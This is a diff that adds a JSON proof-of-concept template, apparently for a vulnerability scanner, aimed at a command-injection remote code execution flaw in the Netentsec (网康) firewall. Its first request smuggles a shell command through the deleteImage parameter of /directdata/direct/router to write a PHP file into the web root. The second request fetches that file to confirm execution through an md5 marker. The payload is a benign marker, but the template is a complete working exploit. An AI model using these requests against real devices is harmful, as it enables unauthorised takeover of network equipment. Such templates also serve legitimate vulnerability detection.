@@ -1,0 +1,61 @@
+{
+    "Name": "netentsec-ngfw-rce",
+    "Description": "netentsec-ngfw-rce",
+    "Product": "网康",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/directdata/direct/router",
+        "Port":"",
+        "Data":"{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;echo '<?php echo md5(123);unlink(__FILE__);?>' >/var/www/html/chumeng.php\"]}],\"type\":\"rpc\",\"tid\":17}",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "SSLVPN_Resource"
+                },
+                {
+                 "Operation": "contains", 
+                 "Key":"",
+                 "Value": "\"result\":{\"success\":true}"
+                 },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":"AND"
+                }, {
+                    "Method": "GET",
+                    "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+                    "Uri":"/chumeng.php",
+                    "Port":"",
+                    "Data":"",
+                    "Follow_redirects":"false",
+                    "Upload":{"Name": "","fileName": "","filePath": "" },
+                    "Response":{
+                    "Check_Steps":"AND",
+                    "Checks": [
+                            {
+                            "Operation": "contains", 
+                            "Key":"",
+                            "Value": "202cb962ac59075b964b07152d234b70"
+                            },
+                             {
+                            "Operation": "code", 
+                            "Key":"",
+                            "Value": "200"  
+                             }
+                    ]
+                    },
+                    "Next_decide":""
+                            }
+]}
